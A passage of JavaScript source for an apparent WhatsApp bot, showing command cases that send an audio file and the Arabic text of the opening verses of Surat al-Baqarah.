 { title: "𝐀𝐮𝐝𝐢𝐨 𝐌𝐮𝐫𝐨𝐭𝐚𝐥", description: "𝐃𝐞𝐧𝐠𝐚𝐫𝐤𝐚𝐧 𝐛𝐚𝐜𝐚𝐧", id: `${prefix}al-fatihah` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'al-baqarah':
case 'baqarah':
case 'albaqarah': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗕𝗔𝗤𝗔𝗥𝗔𝗛\`
Surat ke-2 | 286 ayat | Madaniyah

بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
الٓمّٓۚ
ذٰلِكَ الْكِتٰبُ لَا رَيْبَ ۛ فِيْهِ ۛ هُدًى لِّلْمُتَّقِيْنَۙ
الَّذِيْنَ يُؤْمِنُوْنَ بِالْغَيْبِ وَيُقِيْمُوْنَ الصَّلٰوةَ وَمِمَّا رَزَقْنٰهُمْ يُنْفِقُوْنَۙ
وَالَّذِيْنَ يُؤْمِنُوْنَ بِمَآ اُنْزِلَ اِلَيْكَ وَمَآ اُنْزِلَ مِنْ قَبْلِكَ ۚ وَبِالْاٰخِرَةِ هُمْ يُوْقِنُوْنَۗ
اُولٰۤىِٕكَ عَلٰى هُدًى مِّنْ رَّبِّهِمْ ۖ وَاُولٰۤىِٕكَ هُمُ الْمُفْلِحُوْنَ
اِنَّ الَّذِيْنَ كَفَرُوْا سَوَاۤءٌ عَلَيْهِمْ ءَاَنْذَرْتَهُمْ اَمْ لَمْ تُنْذِرْهُمْ لَا يُؤْمِنُوْنَ
خَتَمَ اللّٰهُ عَلٰى قُلُوْبِهِمْ وَعَلٰى سَمْعِهِمْ ۗ وَعَلٰىٓ اَبْصَارِهِمْ غِشَاوَةٌ وَّلَهُمْ عَذَابٌ عَظِيْمٌ
وَمِنَ النَّاسِ مَنْ يَّقُوْلُ اٰمَنَّا بِاللّٰهِ وَبِالْيَوْمِ الْاٰخِرِ وَمَا هُمْ بِمُؤْمِنِيْنَۘ
يُخٰدِعُوْنَ اللّٰهَ وَالَّذِيْنَ اٰمَنُوْا ۚ وَمَا يَخْدَعُوْنَ اِلَّآ اَنْفُسَهُمْ وَمَا يَشْعُرُوْنَۗ
فِيْ قُلُوْبِهِمْ مَّرَضٌۙ فَزَادَهُمُ اللّٰهُ مَرَضًا ۚ وَلَهُمْ عَذَابٌ اَلِيْمٌ ۢبِمَا كَانُوْا يَكْذِبُوْنَ
وَاِذَا قِيْلَ لَهُمْ لَا تُفْسِدُوْا فِى الْاَرْضِۙ قَالُوْٓا اِنَّمَا نَحْنُ مُصْلِحُوْنَ
اَلَآ اِنَّهُمْ هُمُ الْمُفْسِدُوْنَ وَلٰكِنْ لَّا يَشْعُرُوْنَ
وَاِذَا قِيْلَ لَهُمْ اٰمِنُوْا كَمَآ اٰمَنَ النَّاسُ قَالُوْٓا اَنُؤْمِنُ كَمَآ اٰمَنَ السُّفَهَاۤءُ ۗ اَلَآ اِنَّهُمْ هُمُ السُّفَهَاۤءُ وَلٰكِنْ لَّا يَعْلَمُوْنَ
وَاِذَا لَقُوا الَّذِيْنَ اٰمَنُوْا قَالُوْٓا اٰمَنَّا ۖ وَاِذَا خَلَوْا اِلٰى شَيٰطِيْنِهِمْۙ قَالُوْٓا اِنَّا مَعَكُمْ ۙ اِنَّمَا نَحْنُ مُسْتَهْزِءُوْنَ
اَللّٰهُ يَسْتَهْزِئُ بِهِمْ وَيَمُدُّهُمْ فِيْ طُغْيَانِهِمْ يَعْمَهُوْنَ
اُولٰۤىِٕكَ الَّذِيْنَ اشْتَرَوُا الضَّلٰلَةَ بِالْهُدٰى فَمَا رَبِحَتْ تِّجَارَتُهُمْ وَمَا كَانُوْا مُهْتَدِيْنَ
مَثَلُهُمْ كَمَثَلِ الَّذِى اسْتَوْقَدَ نَارًا ۚ فَلَمَّآ اَضَاۤءَتْ مَا حَوْلَهٗ ذَهَبَ اللّٰهُ بِنُوْرِهِمْ وَتَرَكَهُمْ فِيْ ظُلُمٰتٍ لَّا يُبْصِرُوْنَ
صُمٌّۢ بُكْمٌ عُمْيٌ فَهُمْ لَا يَرْجِعُوْنَۙ
اَوْ كَصَيِّبٍ مِّنَ السَّمَاۤءِ فِيْهِ ظُلُمٰتٌ وَّرَعْدٌ وَّبَرْقٌ ۚ يَجْعَلُوْنَ اَصَابِعَهُمْ فِيْٓ اٰذَانِهِمْ مِّنَ الصَّوَاعِقِ حَذَرَ الْمَوْتِ ۗ وَاللّٰهُ مُحِيْطٌۢ بِالْكٰفِرِيْنَ
يَكَادُ الْبَرْقُ يَخْطَفُ اَبْصَارَهُمْ ۗ كُلَّمَآ اَضَاۤءَ لَهُمْ مَّشَوْا فِيْهِ ۙ وَاِذَآ اَظْلَمَ عَلَيْهِمْ قَامُوْا ۗ وَلَوْ شَاۤءَ اللّٰهُ لَذَهَبَ بِسَمْعِهِمْ وَاَبْصَارِهِمْ ۗ اِنَّ اللّٰهَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
يٰٓاَيُّهَا النَّاسُ اعْبُدُوْا رَبَّكُمُ الَّذِيْ خَلَقَكُمْ وَالَّذِيْنَ مِنْ قَبْلِكُمْ لَعَلَّكُمْ تَتَّقُوْنَۙ
الَّذِيْ جَعَلَ لَكُمُ الْاَرْضَ فِرَاشًا وَّالسَّمَاۤءَ بِنَاۤءً ۖ وَّاَنْزَلَ مِنَ السَّمَاۤءِ مَاۤءً فَاَخْرَجَ بِهٖ مِنَ الثَّمَرٰتِ رِزْقًا لَّكُمْ ۚ فَلَا تَجْعَلُوْا لِلّٰهِ اَنْدَادًا وَّاَنْتُمْ تَعْلَمُوْنَ
وَاِنْ كُنْتُمْ فِيْ رَيْبٍ مِّمَّا نَزَّلْنَا عَلٰى عَبْدِنَا فَأْتُوْا بِسُوْرَةٍ مِّنْ مِّثْلِهٖ ۖ وَادْعُوْا شُهَدَاۤءَكُمْ مِّنْ دُوْنِ اللّٰهِ اِنْ كُنْتُمْ صٰدِقِيْنَ
فَاِنْ لَّمْ تَفْعَلُوْا وَلَنْ تَفْعَلُوْا فَاتَّقُوا النَّارَ الَّتِيْ وَقُوْدُهَا النَّاسُ وَالْحِجَارَةُ ۖ اُعِدَّتْ لِلْكٰفِرِيْنَ
وَبَشِّرِ الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ اَنَّ لَهُمْ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ ۗ كُلَّمَا رُزِقُوْا مِنْهَا مِنْ ثَمَرَةٍ رِّزْقًا ۙ قَالُوْا هٰذَا الَّذِيْ رُزِقْنَا مِنْ قَبْلُ وَاُتُوْا بِهٖ مُتَشَابِهًا ۗ وَلَهُمْ فِيْهَآ اَزْوَاجٌ مُّطَهَّرَةٌ ۙ وَّهُمْ فِيْهَا خٰلِدُوْنَ
اِنَّ اللّٰهَ لَا يَسْتَحْيٖٓ اَنْ يَّضْرِبَ مَثَلًا مَّا بَعُوْضَةً فَمَا فَوْقَهَا ۗ فَاَمَّا الَّذِيْنَ اٰمَنُوْا فَيَعْلَمُوْنَ اَنَّهُ الْحَقُّ مِنْ رَّبِّهِمْ ۚ وَاَمَّا الَّذِيْنَ كَفَرُوْا فَيَقُوْلُوْنَ مَاذَآ اَرَادَ اللّٰهُ بِهٰذَا مَثَلًا ۘ يُضِلُّ بِهٖ كَثِيْرًا وَّيَهْدِيْ بِهٖ كَثِيْرًا ۗ وَمَا يُضِلُّ بِهٖٓ اِلَّا الْفٰسِقِيْنَۙ
الَّذِيْنَ يَنْقُضُوْنَ عَهْدَ اللّٰهِ مِنْۢ بَعْدِ مِيْثَاقِهٖۖ وَيَقْطَعُوْنَ مَآ اَمَرَ اللّٰهُ بِهٖٓ اَنْ يُّوْصَلَ وَيُفْسِدُوْنَ فِى الْاَرْضِ ۗ اُولٰۤىِٕكَ هُمُ الْخٰسِرُوْنَ
كَيْفَ تَكْفُرُوْنَ بِاللّٰهِ وَكُنْتُمْ اَمْوَاتًا فَاَحْيَاكُمْ ۚ ثُمَّ يُمِيْتُكُمْ ثُمَّ يُحْيِيْكُمْ ثُمَّ اِلَيْهِ تُرْجَعُوْنَ
هُوَ الَّذِيْ خَلَقَ لَكُمْ مَّا فِى الْاَرْضِ جَمِيْعًا ثُمَّ اسْتَوٰٓى اِلَى السَّمَاۤءِ فَسَوّٰىهُنَّ سَبْعَ سَمٰوٰتٍ ۗ وَهُوَ بِكُلِّ شَيْءٍ عَلِيْمٌ
وَاِذْ قَالَ رَبُّكَ لِلْمَلٰۤىِٕكَةِ اِنِّيْ جَاعِلٌ فِى الْاَرْضِ خَلِيْفَةً ۗ قَالُوْٓا اَتَجْعَلُ فِيْهَا مَنْ يُّفْسِدُ فِيْهَا وَيَسْفِكُ الدِّمَاۤءَ ۚ وَنَحْنُ نُسَبِّحُ بِحَمْدِكَ وَنُقَدِّسُ لَكَ ۗ قَالَ اِنِّيْٓ اَعْلَمُ مَا لَا تَعْلَمُوْنَ
وَعَلَّمَ اٰدَمَ الْاَسْمَاۤءَ كُلَّهَا ثُمَّ عَرَضَهُمْ عَلَى الْمَلٰۤىِٕكَةِ فَقَالَ اَنْۢبِـُٔوْنِيْ بِاَسْمَاۤءِ هٰٓؤُلَاۤءِ اِنْ كُنْتُمْ صٰدِقِيْنَ
قَالُوْا سُبْحٰنَكَ لَا عِلْمَ لَنَآ اِلَّا مَا عَلَّمْتَنَا ۗ اِنَّكَ اَنْتَ الْعَلِيْمُ الْحَكِيْمُ
قَالَ يٰٓاٰدَمُ اَنْۢبِئْهُمْ بِاَسْمَاۤىِٕهِمْ ۚ فَلَمَّآ اَنْۢبَاَهُمْ بِاَسْمَاۤىِٕهِمْ ۙ قَالَ اَلَمْ اَقُلْ لَّكُمْ اِنِّيْٓ اَعْلَمُ غَيْبَ السَّمٰوٰتِ وَالْاَرْضِ ۙ وَاَعْلَمُ مَا تُبْدُوْنَ وَمَا كُنْتُمْ تَكْتُمُوْنَ
وَاِذْ قُلْنَا لِلْمَلٰۤىِٕكَةِ اسْجُدُوْا لِاٰدَمَ فَسَجَدُوْٓا اِلَّآ اِبْلِيْسَ ۗ اَبٰى وَاسْتَكْبَرَ وَكَانَ مِنَ الْكٰفِرِيْنَ
وَقُلْنَا يٰٓاٰدَمُ اسْكُنْ اَنْتَ وَزَوْجُكَ الْجَنَّةَ وَكُلَا مِنْهَا رَغَدًا حَيْثُ شِئْتُمَا ۖ وَلَا تَقْرَبَا هٰذِهِ الشَّجَرَةَ فَتَكُوْنَا مِنَ الظّٰلِمِيْنَ
فَاَزَلَّهُمَا الشَّيْطٰنُ عَنْهَا فَاَخْرَجَهُمَا مِمَّا كَانَا فِيْهِ ۖ وَقُلْنَا اهْبِطُوْا بَعْضُكُمْ لِبَعْضٍ عَدُوٌّ ۚ وَلَكُمْ فِى الْاَرْضِ مُسْتَقَرٌّ وَّمَتَاعٌ اِلٰى حِيْنٍ
فَتَلَقّٰٓى اٰدَمُ مِنْ رَّبِّهٖ كَلِمٰتٍ فَتَابَ عَلَيْهِ ۗ اِنَّهٗ هُوَ التَّوَّابُ الرَّحِيْمُ
قُلْنَا اهْبِطُوْا مِنْهَا جَمِيْعًا ۚ فَاِمَّا يَأْتِيَنَّكُمْ مِّنِّيْ هُدًى فَمَنْ تَبِعَ هُدَايَ فَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
وَالَّذِيْنَ كَفَرُوْا وَكَذَّبُوْا بِاٰيٰتِنَآ اُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
يٰبَنِيْٓ اِسْرَاۤءِيْلَ اذْكُرُوْا نِعْمَتِيَ الَّتِيْٓ اَنْعَمْتُ عَلَيْكُمْ وَاَوْفُوْا بِعَهْدِيْٓ اُوْفِ بِعَهْدِكُمْ ۚ وَاِيَّايَ فَارْهَبُوْنِ
وَاٰمِنُوْا بِمَآ اَنْزَلْتُ مُصَدِّقًا لِّمَا مَعَكُمْ وَلَا تَكُوْنُوْٓا اَوَّلَ كَافِرٍۢ بِهٖ ۖ وَلَا تَشْتَرُوْا بِاٰيٰتِيْ ثَمَنًا قَلِيْلًا ۖ وَّاِيَّايَ فَاتَّقُوْنِ
وَلَا تَلْبِسُوا الْحَقَّ بِالْبَاطِلِ وَتَكْتُمُوا الْحَقَّ وَاَنْتُمْ تَعْلَمُوْنَ
وَاَقِيْمُوا الصَّلٰوةَ وَاٰتُوا الزَّكٰوةَ وَارْكَعُوْا مَعَ الرّٰكِعِيْنَ
اَتَأْمُرُوْنَ النَّاسَ بِالْبِرِّ وَتَنْسَوْنَ اَنْفُسَكُمْ وَاَنْتُمْ تَتْلُوْنَ الْكِتٰبَ ۗ اَفَلَا تَعْقِلُوْنَ
وَاسْتَعِيْنُوْا بِالصَّبْرِ وَالصَّلٰوةِ ۗ وَاِنَّهَا لَكَبِيْرَةٌ اِلَّا عَلَى الْخٰشِعِيْنَۙ
الَّذِيْنَ يَظُنُّوْنَ اَنَّهُمْ مُّلٰقُوْا رَبِّهِمْ وَاَنَّهُمْ اِلَيْهِ رٰجِعُوْنَ
يٰبَنِيْٓ اِسْرَاۤءِيْلَ اذْكُرُوْا نِعْمَتِيَ الَّتِيْٓ اَنْعَمْتُ عَلَيْكُمْ وَاَنِّيْ فَضَّلْتُكُمْ عَلَى الْعٰلَمِيْنَ
وَاتَّقُوْا يَوْمًا لَّا تَجْزِيْ نَفْسٌ عَنْ نَّفْسٍ شَيْـًٔا وَّلَا يُقْبَلُ مِنْهَا شَفَاعَةٌ وَّلَا يُؤْخَذُ مِنْهَا عَدْلٌ وَّلَا هُمْ يُنْصَرُوْنَ
وَاِذْ نَجَّيْنٰكُمْ مِّنْ اٰلِ فِرْعَوْنَ يَسُوْمُوْنَكُمْ سُوْۤءَ الْعَذَابِ يُذَبِّحُوْنَ اَبْنَاۤءَكُمْ وَيَسْتَحْيُوْنَ نِسَاۤءَكُمْ ۗ وَفِيْ ذٰلِكُمْ بَلَاۤءٌ مِّنْ رَّبِّكُمْ عَظِيْمٌ
وَاِذْ فَرَقْنَا بِكُمُ الْبَحْرَ فَاَنْجَيْنٰكُمْ وَاَغْرَقْنَآ اٰلَ فِرْعَوْنَ وَاَنْتُمْ تَنْظُرُوْنَ
وَاِذْ وٰعَدْنَا مُوْسٰٓى اَرْبَعِيْنَ لَيْلَةً ثُمَّ اتَّخَذْتُمُ الْعِجْلَ مِنْۢ بَعْدِهٖ وَاَنْتُمْ ظٰلِمُوْنَ
ثُمَّ عَفَوْنَا عَنْكُمْ مِّنْۢ بَعْدِ ذٰلِكَ لَعَلَّكُمْ تَشْكُرُوْنَ
وَاِذْ اٰتَيْنَا مُوْسَى الْكِتٰبَ وَالْفُرْقَانَ لَعَلَّكُمْ تَهْتَدُوْنَ
وَاِذْ قَالَ مُوْسٰى لِقَوْمِهٖ يٰقَوْمِ اِنَّكُمْ ظَلَمْتُمْ اَنْفُسَكُمْ بِاتِّخَاذِكُمُ الْعِجْلَ فَتُوْبُوْٓا اِلٰى بَارِىِٕكُمْ فَاقْتُلُوْٓا اَنْفُسَكُمْ ۗ ذٰلِكُمْ خَيْرٌ لَّكُمْ عِنْدَ بَارِىِٕكُمْ ۗ فَتَابَ عَلَيْكُمْ ۗ اِنَّهٗ هُوَ التَّوَّابُ الرَّحِيْمُ
وَاِذْ قُلْتُمْ يٰمُوْسٰى لَنْ نُّؤْمِنَ لَكَ حَتّٰى نَرَى اللّٰهَ جَهْرَةً فَاَخَذَتْكُمُ الصّٰعِقَةُ وَاَنْتُمْ تَنْظُرُوْنَ
ثُمَّ بَعَثْنٰكُمْ مِّنْۢ بَعْدِ مَوْتِكُمْ لَعَلَّكُمْ تَشْكُرُوْنَ
وَظَلَّلْنَا عَلَيْكُمُ الْغَمَامَ وَاَنْزَلْنَا عَلَيْكُمُ الْمَنَّ وَالسَّلْوٰى ۗ كُلُوْا مِنْ طَيِّبٰتِ مَا رَزَقْنٰكُمْ ۗ وَمَا ظَلَمُوْنَا وَلٰكِنْ كَانُوْٓا اَنْفُسَهُمْ يَظْلِمُوْنَ
وَاِذْ قُلْنَا ادْخُلُوْا هٰذِهِ الْقَرْيَةَ فَكُلُوْا مِنْهَا حَيْثُ شِئْتُمْ رَغَدًا وَّادْخُلُوا الْبَابَ سُجَّدًا وَّقُوْلُوْا حِطَّةٌ نَّغْفِرْ لَكُمْ خَطٰيٰكُمْ ۗ وَسَنَزِيْدُ الْمُحْسِنِيْنَ
فَبَدَّلَ الَّذِيْنَ ظَلَمُوْا قَوْلًا غَيْرَ الَّذِيْ قِيْلَ لَهُمْ فَاَنْزَلْنَا عَلَى الَّذِيْنَ ظَلَمُوْا رِجْزًا مِّنَ السَّمَاۤءِ بِمَا كَانُوْا يَفْسُقُوْنَ
وَاِذِ اسْتَسْقٰى مُوْسٰى لِقَوْمِهٖ فَقُلْنَا اضْرِبْ بِّعَصَاكَ الْحَجَرَ ۗ فَانْفَجَرَتْ مِنْهُ اثْنَتَا عَشْرَةَ عَيْنًا ۗ قَدْ عَلِمَ كُلُّ اُنَاسٍ مَّشْرَبَهُمْ ۗ كُلُوْا وَاشْرَبُوْا مِنْ رِّزْقِ اللّٰهِ وَلَا تَعْثَوْا فِى الْاَرْضِ مُفْسِدِيْنَ
وَاِذْ قُلْتُمْ يٰمُوْسٰى لَنْ نَّصْبِرَ عَلٰى طَعَامٍ وَّاحِدٍ فَادْعُ لَنَا رَبَّكَ يُخْرِجْ لَنَا مِمَّا تُنْۢبِتُ الْاَرْضُ مِنْۢ بَقْلِهَا وَقِثَّاۤىِٕهَا وَفُوْمِهَا وَعَدَسِهَا وَبَصَلِهَا ۗ قَالَ اَتَسْتَبْدِلُوْنَ الَّذِيْ هُوَ اَدْنٰى بِالَّذِيْ هُوَ خَيْرٌ ۗ اِهْبِطُوْا مِصْرًا فَاِنَّ لَكُمْ مَّا سَاَلْتُمْ ۗ وَضُرِبَتْ عَلَيْهِمُ الذِّلَّةُ وَالْمَسْكَنَةُ وَبَاۤءُوْ بِغَضَبٍ مِّنَ اللّٰهِ ۗ ذٰلِكَ بِاَنَّهُمْ كَانُوْا يَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَيَقْتُلُوْنَ النَّبِيّٖنَ بِغَيْرِ الْحَقِّ ۗ ذٰلِكَ بِمَا عَصَوْا وَّكَانُوْا يَعْتَدُوْنَ
اِنَّ الَّذِيْنَ اٰمَنُوْا وَالَّذِيْنَ هَادُوْا وَالنَّصٰرٰى وَالصّٰبِـِٕيْنَ مَنْ اٰمَنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَعَمِلَ صَالِحًا فَلَهُمْ اَجْرُهُمْ عِنْدَ رَبِّهِمْ ۚ وَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
وَاِذْ اَخَذْنَا مِيْثَاقَكُمْ وَرَفَعْنَا فَوْقَكُمُ الطُّوْرَ ۗ خُذُوْا مَآ اٰتَيْنٰكُمْ بِقُوَّةٍ وَّاذْكُرُوْا مَا فِيْهِ لَعَلَّكُمْ تَتَّقُوْنَ
ثُمَّ تَوَلَّيْتُمْ مِّنْۢ بَعْدِ ذٰلِكَ ۚ فَلَوْلَا فَضْلُ اللّٰهِ عَلَيْكُمْ وَرَحْمَتُهٗ لَكُنْتُمْ مِّنَ الْخٰسِرِيْنَ
وَلَقَدْ عَلِمْتُمُ الَّذِيْنَ اعْتَدَوْا مِنْكُمْ فِى السَّبْتِ فَقُلْنَا لَهُمْ كُوْنُوْا قِرَدَةً خَاسِـِٔيْنَ
فَجَعَلْنٰهَا نَكَالًا لِّمَا بَيْنَ يَدَيْهَا وَمَا خَلْفَهَا وَمَوْعِظَةً لِّلْمُتَّقِيْنَ
وَاِذْ قَالَ مُوْسٰى لِقَوْمِهٖٓ اِنَّ اللّٰهَ يَأْمُرُكُمْ اَنْ تَذْبَحُوْا بَقَرَةً ۗ قَالُوْٓا اَتَتَّخِذُنَا هُزُوًا ۗ قَالَ اَعُوْذُ بِاللّٰهِ اَنْ اَكُوْنَ مِنَ الْجٰهِلِيْنَ
قَالُوا ادْعُ لَنَا رَبَّكَ يُبَيِّنْ لَّنَا مَا هِيَ ۗ قَالَ اِنَّهٗ يَقُوْلُ اِنَّهَا بَقَرَةٌ لَّا فَارِضٌ وَّلَا بِكْرٌ ۙ عَوَانٌۢ بَيْنَ ذٰلِكَ ۖ فَافْعَلُوْا مَا تُؤْمَرُوْنَ
قَالُوا ادْعُ لَنَا رَبَّكَ يُبَيِّنْ لَّنَا مَا لَوْنُهَا ۗ قَالَ اِنَّهٗ يَقُوْلُ اِنَّهَا بَقَرَةٌ صَفْرَاۤءُ فَاقِعٌ لَّوْنُهَا تَسُرُّ النّٰظِرِيْنَ
قَالُوا ادْعُ لَنَا رَبَّكَ يُبَيِّنْ لَّنَا مَا هِيَ ۙ اِنَّ الْبَقَرَ تَشَابَهَ عَلَيْنَا ۗ وَاِنَّآ اِنْ شَاۤءَ اللّٰهُ لَمُهْتَدُوْنَ
قَالَ اِنَّهٗ يَقُوْلُ اِنَّهَا بَقَرَةٌ لَّا ذَلُوْلٌ تُثِيْرُ الْاَرْضَ وَلَا تَسْقِى الْحَرْثَ ۚ مُسَلَّمَةٌ لَّا شِيَةَ فِيْهَا ۗ قَالُوا الْـٰٔنَ جِئْتَ بِالْحَقِّ ۗ فَذَبَحُوْهَا وَمَا كَادُوْا يَفْعَلُوْنَ
وَاِذْ قَتَلْتُمْ نَفْسًا فَادّٰرَءْتُمْ فِيْهَا ۖ وَاللّٰهُ مُخْرِجٌ مَّا كُنْتُمْ تَكْتُمُوْنَ
فَقُلْنَا اضْرِبُوْهُ بِبَعْضِهَا ۗ كَذٰلِكَ يُحْيِ اللّٰهُ الْمَوْتٰى ۙ وَيُرِيْكُمْ اٰيٰتِهٖ لَعَلَّكُمْ تَعْقِلُوْنَ
ثُمَّ قَسَتْ قُلُوْبُكُمْ مِّنْۢ بَعْدِ ذٰلِكَ فَهِيَ كَالْحِجَارَةِ اَوْ اَشَدُّ قَسْوَةً ۚ وَاِنَّ مِنَ الْحِجَارَةِ لَمَا يَتَفَجَّرُ مِنْهُ الْاَنْهٰرُ ۚ وَاِنَّ مِنْهَا لَمَا يَشَّقَّقُ فَيَخْرُجُ مِنْهُ الْمَاۤءُ ۚ وَاِنَّ مِنْهَا لَمَا يَهْبِطُ مِنْ خَشْيَةِ اللّٰهِ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا تَعْمَلُوْنَ
اَفَتَطْمَعُوْنَ اَنْ يُّؤْمِنُوْا لَكُمْ وَقَدْ كَانَ فَرِيْقٌ مِّنْهُمْ يَسْمَعُوْنَ كَلَامَ اللّٰهِ ثُمَّ يُحَرِّفُوْنَهٗ مِنْۢ بَعْدِ مَا عَقَلُوْهُ وَهُمْ يَعْلَمُوْنَ
وَاِذَا لَقُوا الَّذِيْنَ اٰمَنُوْا قَالُوْٓا اٰمَنَّا ۖ وَاِذَا خَلَا بَعْضُهُمْ اِلٰى بَعْضٍ قَالُوْٓا اَتُحَدِّثُوْنَهُمْ بِمَا فَتَحَ اللّٰهُ عَلَيْكُمْ لِيُحَاۤجُّوْكُمْ بِهٖ عِنْدَ رَبِّكُمْ ۗ اَفَلَا تَعْقِلُوْنَ
اَوَلَا يَعْلَمُوْنَ اَنَّ اللّٰهَ يَعْلَمُ مَا يُسِرُّوْنَ وَمَا يُعْلِنُوْنَ
وَمِنْهُمْ اُمِّيُّوْنَ لَا يَعْلَمُوْنَ الْكِتٰبَ اِلَّآ اَمَانِيَّ وَاِنْ هُمْ اِلَّا يَظُنُّوْنَ
فَوَيْلٌ لِّلَّذِيْنَ يَكْتُبُوْنَ الْكِتٰبَ بِاَيْدِيْهِمْ ثُمَّ يَقُوْلُوْنَ هٰذَا مِنْ عِنْدِ اللّٰهِ لِيَشْتَرُوْا بِهٖ ثَمَنًا قَلِيْلًا ۗ فَوَيْلٌ لَّهُمْ مِّمَّا كَتَبَتْ اَيْدِيْهِمْ وَوَيْلٌ لَّهُمْ مِّمَّا يَكْسِبُوْنَ
وَقَالُوْا لَنْ تَمَسَّنَا النَّارُ اِلَّآ اَيَّامًا مَّعْدُوْدَةً ۗ قُلْ اَتَّخَذْتُمْ عِنْدَ اللّٰهِ عَهْدًا فَلَنْ يُّخْلِفَ اللّٰهُ عَهْدَهٗٓ ۖ اَمْ تَقُوْلُوْنَ عَلَى اللّٰهِ مَا لَا تَعْلَمُوْنَ
بَلٰى مَنْ كَسَبَ سَيِّئَةً وَّاَحَاطَتْ بِهٖ خَطِيْۤـَٔتُهٗ فَاُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
وَالَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ اُولٰۤىِٕكَ اَصْحٰبُ الْجَنَّةِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
وَاِذْ اَخَذْنَا مِيْثَاقَ بَنِيْٓ اِسْرَاۤءِيْلَ لَا تَعْبُدُوْنَ اِلَّا اللّٰهَ وَبِالْوَالِدَيْنِ اِحْسَانًا وَّذِى الْقُرْبٰى وَالْيَتٰمٰى وَالْمَسٰكِيْنِ وَقُوْلُوْا لِلنَّاسِ حُسْنًا وَّاَقِيْمُوا الصَّلٰوةَ وَاٰتُوا الزَّكٰوةَ ۗ ثُمَّ تَوَلَّيْتُمْ اِلَّا قَلِيْلًا مِّنْكُمْ وَاَنْتُمْ مُّعْرِضُوْنَ
وَاِذْ اَخَذْنَا مِيْثَاقَكُمْ لَا تَسْفِكُوْنَ دِمَاۤءَكُمْ وَلَا تُخْرِجُوْنَ اَنْفُسَكُمْ مِّنْ دِيَارِكُمْ ثُمَّ اَقْرَرْتُمْ وَاَنْتُمْ تَشْهَدُوْنَ
ثُمَّ اَنْتُمْ هٰٓؤُلَاۤءِ تَقْتُلُوْنَ اَنْفُسَكُمْ وَتُخْرِجُوْنَ فَرِيْقًا مِّنْكُمْ مِّنْ دِيَارِهِمْ تَظٰهَرُوْنَ عَلَيْهِمْ بِالْاِثْمِ وَالْعُدْوَانِ ۗ وَاِنْ يَّأْتُوْكُمْ اُسٰرٰى تُفٰدُوْهُمْ وَهُوَ مُحَرَّمٌ عَلَيْكُمْ اِخْرَاجُهُمْ ۗ اَفَتُؤْمِنُوْنَ بِبَعْضِ الْكِتٰبِ وَتَكْفُرُوْنَ بِبَعْضٍ ۚ فَمَا جَزَاۤءُ مَنْ يَّفْعَلُ ذٰلِكَ مِنْكُمْ اِلَّا خِزْيٌ فِى الْحَيٰوةِ الدُّنْيَا ۚ وَيَوْمَ الْقِيٰمَةِ يُرَدُّوْنَ اِلٰٓى اَشَدِّ الْعَذَابِ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا تَعْمَلُوْنَ
اُولٰۤىِٕكَ الَّذِيْنَ اشْتَرَوُا الْحَيٰوةَ الدُّنْيَا بِالْاٰخِرَةِ ۖ فَلَا يُخَفَّفُ عَنْهُمُ الْعَذَابُ وَلَا هُمْ يُنْصَرُوْنَ
وَلَقَدْ اٰتَيْنَا مُوْسَى الْكِتٰبَ وَقَفَّيْنَا مِنْۢ بَعْدِهٖ بِالرُّسُلِ ۖ وَاٰتَيْنَا عِيْسَى ابْنَ مَرْيَمَ الْبَيِّنٰتِ وَاَيَّدْنٰهُ بِرُوْحِ الْقُدُسِ ۗ اَفَكُلَّمَا جَاۤءَكُمْ رَسُوْلٌۢ بِمَا لَا تَهْوٰٓى اَنْفُسُكُمُ اسْتَكْبَرْتُمْ ۚ فَفَرِيْقًا كَذَّبْتُمْ وَفَرِيْقًا تَقْتُلُوْنَ
وَقَالُوْا قُلُوْبُنَا غُلْفٌ ۗ بَلْ لَّعَنَهُمُ اللّٰهُ بِكُفْرِهِمْ فَقَلِيْلًا مَّا يُؤْمِنُوْنَ
وَلَمَّا جَاۤءَهُمْ كِتٰبٌ مِّنْ عِنْدِ اللّٰهِ مُصَدِّقٌ لِّمَا مَعَهُمْ وَكَانُوْا مِنْ قَبْلُ يَسْتَفْتِحُوْنَ عَلَى الَّذِيْنَ كَفَرُوْا ۚ فَلَمَّا جَاۤءَهُمْ مَّا عَرَفُوْا كَفَرُوْا بِهٖ ۚ فَلَعْنَةُ اللّٰهِ عَلَى الْكٰفِرِيْنَ
بِئْسَمَا اشْتَرَوْا بِهٖٓ اَنْفُسَهُمْ اَنْ يَّكْفُرُوْا بِمَآ اَنْزَلَ اللّٰهُ بَغْيًا اَنْ يُّنَزِّلَ اللّٰهُ مِنْ فَضْلِهٖ عَلٰى مَنْ يَّشَاۤءُ مِنْ عِبَادِهٖ ۚ فَبَاۤءُوْ بِغَضَبٍ عَلٰى غَضَبٍ ۗ وَلِلْكٰفِرِيْنَ عَذَابٌ مُّهِيْنٌ
